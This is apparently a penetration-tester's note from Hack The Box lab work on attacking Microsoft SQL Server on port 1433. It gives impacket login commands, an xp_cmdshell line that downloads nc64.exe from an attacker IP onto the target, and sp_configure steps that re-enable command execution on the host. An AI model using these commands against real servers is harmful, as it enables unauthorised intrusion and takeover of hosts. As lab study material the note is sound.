---
type: service
platform: windows
status: working
fluency: guided
source: htb
updated: 2026-08-30
---

# 1433 — MSSQL

Microsoft SQL Server: a database that, with the right account, runs operating-system commands. Reach for this note when 1433 is open and you already hold a credential — from config looting, a web app, or a service account — because MSSQL is most often the *cash-in* for a credential found elsewhere, not a port you crack blind.

## Connecting

**Why now** — you hold a username and password (or a Windows/domain account) and nmap shows
1433. This is where you spend that credential: a login here can lead directly to command execution, so it is worth trying before slower routes.

```bash
impacket-mssqlclient user:password@10.10.10.X -windows-auth
```

- `impacket-mssqlclient` → Kali's packaged Impacket client; no separate install.
- `-windows-auth` → authenticate as a Windows/domain account instead of a SQL login. This is the flag people omit: a `sql_svc` domain account fails as a SQL login and succeeds only with `-windows-auth`, and the failure looks identical to a wrong password.

If you are running Impacket from source instead of the packaged binary:

```bash
python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
```

- `ARCHETYPE/sql_svc` → the `DOMAIN/username` form; the domain is the [[Security-Terms#^netbios|NetBIOS]] name, not an [[Security-Terms#^fqdn|FQDN]].

**What you will see**

- **Found** — a `SQL>` or `SQL (user dbo@master)>` prompt. The `dbo` in the prompt is worth reading: it names the role you landed in, which decides whether the next section will work.
- **Empty** — not applicable; you either get a prompt or an error.
- **Error** — `Login failed for user` is a rejected credential. Which auth mode failed is the clue: failing as SQL auth but succeeding with `-windows-auth` (or the reverse) tells you what *kind* of credential you actually hold. `[Errno Connection error]` is 1433 filtered rather than a bad password — reach it through a tunnel ([[Pivoting-and-Tunneling]]).
- **Noise** — a `Login failed` that names `NT AUTHORITY\ANONYMOUS LOGON` means Windows auth was attempted without a valid token, not that your password is wrong.

**Then** — a prompt goes to *Command execution via xp_cmdshell*. A rejected credential goes back to [[Config-File-Looting]] for the right pair, or to [[SQL-Injection]] if you reached MSSQL through a web injection rather than a login.

## Command execution via xp_cmdshell

**Why now** — you have a SQL prompt and you want a foothold on the host, not just data. MSSQL can shell out through the `xp_cmdshell` stored procedure, which turns a database login into OS command execution as the service account.

```text
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe"
```

- `xp_cmdshell` → runs the string as an OS command on the SQL host.
- `cd C:\Users\...\Downloads;` → move to a writable directory first. `xp_cmdshell` runs from the SQL data directory by default, where the service account often cannot write, so a download fails with an access error that looks like a network problem.
- `-outfile nc64.exe` → PowerShell's `wget` alias (`Invoke-WebRequest`) needs an explicit output path or it prints the response to the console instead of saving it.

**What you will see**

- **Found** — the command's stdout printed under the prompt, or, for a download, no error and the file present on the next `xp_cmdshell "dir"`.
- **Empty** — silent output usually means the command ran and wrote nothing to stdout, **not** that it failed. Confirm with something that must print, like `whoami`.
- **Error** — `SQL Server blocked access to procedure 'sys.xp_cmdshell'` means the procedure is disabled (the default), not that you lack rights — see the re-enable below. A genuine permissions wall reads `The EXECUTE permission was denied` and means this account is not privileged enough.
- **Noise** — `xp_cmdshell` returns output as a single `output` column with `NULL` padding rows. The `NULL`s are formatting, not failure.

To re-enable `xp_cmdshell` when the account is privileged enough:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

- `RECONFIGURE` → the setting does not take effect without it; run each line's `RECONFIGURE` or the change sits pending and `xp_cmdshell` stays blocked.

**Then** — working command execution goes to [[Shells]] to trade one-shot commands for a real reverse shell, and to [[File-Transfer]] for staging `nc64.exe` and tooling. The MSSQL service account frequently holds `SeImpersonatePrivilege`, so a shell here goes straight to [[Windows-Privilege-Escalation]]. `EXECUTE permission denied` closes this route — fall back to reading data the login *can* see, and to [[Windows-Credential-Harvesting]] for a better account.

## Reading the output

The trap on this port is reading a *disabled* feature as a *denied* one. `xp_cmdshell` is off by default, and the block message says nothing about your rights — a privileged account simply turns it on. Do not abandon command execution until you have tried the `sp_configure` re-enable; that single step is the difference between "no shell here" and owning the host.

## Next

- [[Shells]] — turn `xp_cmdshell` into a real reverse shell instead of one-shot commands
- [[File-Transfer]] — staging `nc64.exe` and tooling onto the host
- [[Windows-Privilege-Escalation]] — the MSSQL service account often holds `SeImpersonatePrivilege`
- [[SQL-Injection]] — if you reached MSSQL through an injection rather than a login

## Gaps

- No `mssqlclient` linked-server enumeration (`EXEC ... AT`), a common trust-abuse path.
- Nothing on `xp_dirtree` / `xp_subdirs` to coerce an [[Security-Terms#^ntlm|NTLM]] authentication out of the SQL service.
